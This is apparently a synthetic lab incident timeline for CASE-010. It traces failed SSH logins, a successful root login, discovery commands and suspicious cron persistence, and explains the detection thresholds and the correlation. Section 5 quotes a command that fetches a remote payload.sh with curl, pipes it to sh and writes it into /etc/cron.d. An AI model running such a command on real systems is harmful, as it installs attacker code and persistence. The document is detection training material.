# CASE-010 — Investigation Timeline

## 1. Timeline Overview

This timeline reconstructs the synthetic telemetry associated with CASE-010 in chronological order.

The timeline includes:

* authentication activity;
* successful authentication;
* session establishment;
* post-authentication commands;
* suspicious persistence activity; and
* benign scheduled-task administration considered during investigation.

All timestamps originate from the CASE-010 synthetic laboratory telemetry.

## 2. Chronological Timeline

| Time (UTC) | Event ID     | Event Type        | Host           | User   | Activity                                                       | Assessment                          |
| ---------- | ------------ | ----------------- | -------------- | ------ | -------------------------------------------------------------- | ----------------------------------- |
| 10:00:01   | `EVT-010001` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Observed failed authentication      |
| 10:00:17   | `EVT-010002` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Observed failed authentication      |
| 10:00:33   | `EVT-010003` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Observed failed authentication      |
| 10:00:49   | `EVT-010004` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Observed failed authentication      |
| 10:01:05   | `EVT-010005` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Observed failed authentication      |
| 10:01:25   | `EVT-010006` | Authentication    | `lab-linux-10` | `root` | Failed SSH authentication from `198.51.100.90`                 | Sixth failure; threshold exceeded   |
| 10:02:03   | `EVT-010007` | Authentication    | `lab-linux-10` | `root` | Successful SSH authentication; session `SES-010-A`             | Successful authentication observed  |
| 10:02:08   | `EVT-010008` | Session           | `lab-linux-10` | `root` | SSH session start                                              | Post-authentication activity begins |
| 10:02:24   | `EVT-010009` | Command           | `lab-linux-10` | `root` | `whoami`                                                       | Account/context discovery           |
| 10:02:41   | `EVT-010010` | Command           | `lab-linux-10` | `root` | `id`                                                           | Identity/group discovery            |
| 10:03:02   | `EVT-010011` | Command           | `lab-linux-10` | `root` | `sudo -l`                                                      | Privilege-related enumeration       |
| 10:03:21   | `EVT-010012` | Command           | `lab-linux-10` | `root` | `uname -a`                                                     | Host/system discovery               |
| 10:12:00   | `EVT-010013` | Linux persistence | `lab-linux-10` | `root` | Cron persistence activity involving `curl` and shell execution | Suspicious persistence activity     |
| 10:14:00   | `EVT-010014` | Linux persistence | `lab-linux-10` | `root` | `crontab -e` against `/var/spool/cron/crontabs/root`           | Benign/administrative candidate     |

## 3. Authentication Sequence

The initial sequence consists of six failed SSH authentication attempts:

```text
10:00:01  EVT-010001  failure
10:00:17  EVT-010002  failure
10:00:33  EVT-010003  failure
10:00:49  EVT-010004  failure
10:01:05  EVT-010005  failure
10:01:25  EVT-010006  failure
```

The configured `DET-AUTH-001` threshold is five failed attempts within five minutes.

The sixth failure therefore satisfies the configured detection threshold.

At `10:02:03`, `EVT-010007` records a successful SSH authentication for `root`.

## 4. Post-Authentication Sequence

The successful authentication is followed by:

```text
10:02:08  EVT-010008  session_start
10:02:24  EVT-010009  whoami
10:02:41  EVT-010010  id
10:03:02  EVT-010011  sudo -l
10:03:21  EVT-010012  uname -a
```

This sequence represents four observed post-authentication commands.

The activity is associated with session:

`SES-010-A`

The commands provide discovery and privilege-related context but are not inherently malicious.

## 5. Persistence Sequence

At `10:12:00`, `EVT-010013` records suspicious Linux persistence activity.

Relevant observed values include:

* Process: `bash`
* File path: `/etc/cron.d/system-update`
* User: `root`
* Successful event status
* Download source: `203.0.113.80`
* Download utility: `curl`
* Shell execution: `sh`
* Hidden payload indicator: `true`

The observed command line is:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

The event triggered three Linux persistence indicators:

1. `cron_persistence_path`
2. `shell_download_execution`
3. `hidden_or_tmp_payload`

## 6. Benign Activity Considered

At `10:14:00`, `EVT-010014` records:

```text
crontab -e
```

against:

```text
/var/spool/cron/crontabs/root
```

This activity does not satisfy the suspicious Linux persistence detection threshold.

It was therefore excluded from the CASE-010 correlated alert.

Its presence is nevertheless important because legitimate scheduled-task administration can resemble persistence activity at the telemetry level.

## 7. Detection Stage Boundaries

The correlation engine represents the investigation as three stages.

### Stage 1 — Credential Access

**Detection:** `DET-AUTH-001`

Relevant sequence:

`EVT-010001` → `EVT-010007`

Stage timestamp used by correlation:

`2026-09-09T10:02:03Z`

### Stage 2 — Post-Authentication Activity

**Detection:** `DET-AUTH-003`

Relevant sequence:

`EVT-010007` → `EVT-010012`

Stage timestamp used by correlation:

`2026-09-09T10:03:21+00:00`

### Stage 3 — Persistence

**Detection:** `DET-LINUX-001`

Relevant event:

`EVT-010013`

Stage timestamp:

`2026-09-09T10:12:00Z`

## 8. Correlated Sequence

The resulting investigation sequence is:

```text
Authentication attack
       |
       v
Successful authentication
       |
       v
Post-authentication session
       |
       v
Discovery / privilege-related commands
       |
       v
Suspicious cron persistence
       |
       v
DET-CORR-001
```

The correlation begins at:

`2026-09-09T10:02:03Z`

and ends at:

`2026-09-09T10:12:00Z`

The correlated detection window therefore spans approximately ten minutes.

## 9. Supporting Evidence

The final correlated alert contains 13 supporting events:

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
EVT-010007
EVT-010008
EVT-010009
EVT-010010
EVT-010011
EVT-010012
EVT-010013
```

`EVT-010014` is not part of the correlated evidence because it represents a separate scheduled-task administration event that did not trigger `DET-LINUX-001`.

## 10. Investigation Interpretation

The timeline demonstrates a coherent chronological relationship between:

1. repeated SSH authentication failures;
2. successful authentication;
3. post-authentication activity;
4. suspicious cron persistence activity.

The temporal relationship supports the CASE-010 multi-stage attack hypothesis.

The timeline does not independently prove that the activity was unauthorized or that compromise occurred.

## 11. Timeline Limitations

The timeline is limited to events present in the synthetic CASE-010 telemetry.

Missing endpoint, identity, network, process, file-system, or authentication context could change the interpretation of the sequence.

Timestamps are treated as laboratory evidence and are assumed to be sufficiently reliable for this scenario.

Timestamp manipulation or missing events could affect sequence reconstruction in a real investigation.
